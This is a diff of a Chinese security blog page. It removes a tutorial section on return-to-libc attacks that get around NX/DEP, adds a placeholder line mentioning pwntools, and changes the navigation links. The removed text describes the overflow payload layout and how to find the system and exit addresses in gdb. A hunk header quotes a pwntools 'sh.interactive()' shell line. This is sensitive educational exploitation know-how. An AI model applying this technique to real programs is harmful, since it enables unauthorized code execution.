-<h2 id="return-to-libc-绕过NX"><a href="#return-to-libc-绕过NX" class="headerlink" title="return to libc(绕过NX)"></a>return to libc(绕过NX)</h2><h3 id="数据执行保护"><a href="#数据执行保护" class="headerlink" title="数据执行保护"></a>数据执行保护</h3><p>在linux环境下所说的NX与windows平台下的DEP是同一个东西，即数据执行保护。</p>
-<p>其功能为通过将非代码段的代码设为不可执行，从而避免程序流被劫持到堆栈等位置的shellcode中。一旦EIP移动到非代码段中，CPU就会报异常，然后杀死这个进程。</p>
-<p>在64位系统上，这个防护的实现主要通过内存页上的NX位。在windows环境下的32位系统则通过软件模拟的方式实现了这一防护。而linux的32位操作系统则没有这样的防护可以选择.</p>
-<blockquote>
-<p>微软在windows XP系统上首先实现了这一防护。<br>此外这一机制在windows上一般被称为DEP，而在linux上被称作NX。</p>
-</blockquote>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>虽然非代码段代码无法正常执行，但是我们可以把代码注入到现成的代码段。我们可以通过调用libc中的system函数来实现我们之前的shellcode中的功能。根据32位函数调用的规范，它会将堆栈中的数据当成参数。而堆栈的更改可以通过溢出等方式来实现（如果开了金丝雀防护的话需要从长计议）。</p>
-<blockquote>
-<p>在linux中使用了libc的加强版本glibc。</p>
-</blockquote>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>因为我们需要伪造一个调用</p>
-<p>所以我们的payload是A*n + system地址（对应EIP） + 返回地址 + “/bash/sh”(参数)</p>
-<p>首先通过pattern生成一个足够大的字符串，定位EIP的位置与A的数量，这都是老生常谈的了。但是我们这次需要查看转储的核心文件core。</p>
-<p>我们通过<code>p system</code></p>
-<p>暴露出libc中system函数的位置。</p>
-<p>当然，如果你想要避免程序的非正常退出（瞎填的EIP使程序走向了奇怪的位置），你也可以在返回地址中填入exit的地址。</p>
-<p>方法为<code>p exit</code></p>
-<blockquote>
-<p>巧妙地设计甚至可以绕过aslr因为不再需要定位shellcode。</p>
-</blockquote>
-<h3 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h3><p>如果你使用过这个方法的话，你就会发现这个方法是行不通的，因为现在有了一种新的保护机制叫做ASCII armoring来对抗ret2libc，它把libc中所有的地址的第一个字节都设为零，这就导致了在溢出时溢出内容会被截断，而开了NX以后又无法使用shellcode来绕过这一个限制。</p>
-<hr>
-<p>本来应该在之后根据ASCII armoring的弱点讲ret2plt，但是在这之前还需要补充很多知识，才可以继续。故将新开一篇文章来对glibc中的一些特性进行讲解。</p>
+<p>pentools 可以很快速的进行此漏洞利用，下次有空补上</p>
 
     
 
@@ -696,7 +557,7 @@ sh.interactive() # 直接反弹shell进行交互
             <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
     <!-- Prev Nav -->
     
-        <a href="/2018/06/14/实用小工具/" id="post_nav-newer" class="prev-content">
+        <a href="/2018/06/14/unlink/" id="post_nav-newer" class="prev-content">
             <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                 <i class="material-icons">arrow_back</i>
             </button>
@@ -709,6 +570,14 @@ sh.interactive() # 直接反弹shell进行交互
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2018/06/14/最基本的堆溢出-fastbin/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
